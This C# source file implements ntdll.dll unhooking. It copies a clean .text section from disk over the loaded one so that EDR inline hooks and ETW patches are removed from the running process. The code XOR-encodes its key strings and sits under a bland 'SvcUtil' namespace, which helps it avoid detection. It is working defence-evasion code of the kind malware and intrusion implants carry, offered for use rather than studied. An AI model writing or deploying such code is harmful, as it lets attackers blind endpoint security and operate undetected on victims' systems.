using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    /// <summary>
    /// Ntdll unhooking via clean disk copy.
    /// Reads a fresh ntdll.dll from System32, parses its PE headers
    /// to locate the .text section, then overwrites the in-memory
    /// (potentially hooked) .text section with the clean copy.
    ///
    /// This removes ALL userland hooks from ntdll — including:
    ///   - EDR inline hooks on Nt* functions
    ///   - ETW patches (EtwEventWrite)
    ///   - Any other code-page modifications by security products
    ///
    /// Scope: current process only. Does not affect child processes.
    /// Should be called early, before EDR has a chance to re-hook.
    /// </summary>
    internal static class NtdllUnhook
    {
        // ── String encoding ────────────────────────────────────────
        private static readonly byte[] _xk = { 0xD4, 0x2F, 0x8B, 0x17, 0x63 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // Encoded: "ntdll.dll"
        private static readonly byte[] _sNtdll =
            { 0xBA, 0x5B, 0xEF, 0x7B, 0x0F, 0xFA, 0x4B, 0xE7, 0x7B };

        // Encoded: ".text"
        private static readonly byte[] _sText =
            { 0xFA, 0x5B, 0xEE, 0x6F, 0x17 };

        // ── PE section descriptor ──────────────────────────────────

        private struct SectionInfo
        {
            public uint VirtualAddress;
            public uint VirtualSize;
            public uint PointerToRawData;
            public uint SizeOfRawData;
        }

        // ── Public API ─────────────────────────────────────────────

        /// <summary>
        /// Restore the .text section of the loaded ntdll.dll from
        /// a clean copy on disk. Removes all inline hooks.
        /// </summary>
        public static bool Run()
        {
            try
            {
                // 1. Get base address of loaded ntdll
                IntPtr ntdllBase = W.M0(D(_sNtdll));
                if (ntdllBase == IntPtr.Zero)
                    return false;

                // 2. Read clean ntdll from System32
                string sysDir = Environment.GetFolderPath(
                    Environment.SpecialFolder.System);
                string ntdllPath = Path.Combine(sysDir, D(_sNtdll));

                byte[] cleanPe;
                try
                {
                    cleanPe = File.ReadAllBytes(ntdllPath);
                }
                catch
                {
                    return false;
                }

                // 3. Find .text section in the clean PE
                SectionInfo textSection;
                if (!FindTextSection(cleanPe, out textSection))
                {
                    Array.Clear(cleanPe, 0, cleanPe.Length);
                    return false;
                }

                // 4. Validate offsets before copying
                int copySize = (int)Math.Min(
                    textSection.VirtualSize,
                    textSection.SizeOfRawData);

                if (textSection.PointerToRawData + copySize > cleanPe.Length)
                {
                    Array.Clear(cleanPe, 0, cleanPe.Length);
                    return false;
                }

                // 5. Calculate target address in loaded ntdll
                IntPtr targetAddr = (IntPtr)(
                    ntdllBase.ToInt64() + textSection.VirtualAddress);

                // 6. Change memory protection to PAGE_EXECUTE_READWRITE
                uint oldProtect;
                if (!W.MB(targetAddr, (UIntPtr)copySize,
                        0x40, out oldProtect))
                {
                    Array.Clear(cleanPe, 0, cleanPe.Length);
                    return false;
                }

                // 7. Overwrite hooked .text with clean bytes
                Marshal.Copy(cleanPe,
                    (int)textSection.PointerToRawData,
                    targetAddr, copySize);

                // 8. Restore original protection
                uint ignored;
                W.MB(targetAddr, (UIntPtr)copySize,
                    oldProtect, out ignored);

                // 9. Clear the clean PE from memory
                Array.Clear(cleanPe, 0, cleanPe.Length);

                return true;
            }
            catch
            {
                return false;
            }
        }

        // ── PE Parsing ─────────────────────────────────────────────

        /// <summary>
        /// Parse PE headers to find the .text section.
        /// </summary>
        private static bool FindTextSection(byte[] pe,
            out SectionInfo info)
        {
            info = default(SectionInfo);

            if (pe.Length < 0x40) return false;

            // DOS header → PE offset
            uint elf = BitConverter.ToUInt32(pe, 0x3C);
            if (elf + 4 > pe.Length) return false;

            // Validate PE signature
            if (pe[elf] != 'P' || pe[elf + 1] != 'E' ||
                pe[elf + 2] != 0 || pe[elf + 3] != 0)
                return false;

            // COFF header
            uint coff = elf + 4;
            ushort numSections = BitConverter.ToUInt16(
                pe, (int)coff + 2);
            ushort optSize = BitConverter.ToUInt16(
                pe, (int)coff + 16);

            // Optional header — verify x64
            uint opt = coff + 20;
            if (BitConverter.ToUInt16(pe, (int)opt) != 0x020B)
                return false;

            // Section headers start after optional header
            uint secOff = opt + optSize;

            // Decode target section name
            string textName = D(_sText);

            for (int i = 0; i < numSections; i++)
            {
                uint s = secOff + (uint)(i * 40);
                if (s + 40 > pe.Length) return false;

                // Section name is 8 bytes, null-padded
                bool match = true;
                for (int j = 0; j < textName.Length; j++)
                {
                    if (pe[s + j] != (byte)textName[j])
                    {
                        match = false;
                        break;
                    }
                }

                // Verify remaining name bytes are null
                if (match)
                {
                    for (int j = textName.Length; j < 8; j++)
                    {
                        if (pe[s + j] != 0)
                        {
                            match = false;
                            break;
                        }
                    }
                }

                if (match)
                {
                    info.VirtualSize = BitConverter.ToUInt32(
                        pe, (int)s + 8);
                    info.VirtualAddress = BitConverter.ToUInt32(
                        pe, (int)s + 12);
                    info.SizeOfRawData = BitConverter.ToUInt32(
                        pe, (int)s + 16);
                    info.PointerToRawData = BitConverter.ToUInt32(
                        pe, (int)s + 20);
                    return true;
                }
            }

            return false;
        }
    }
}
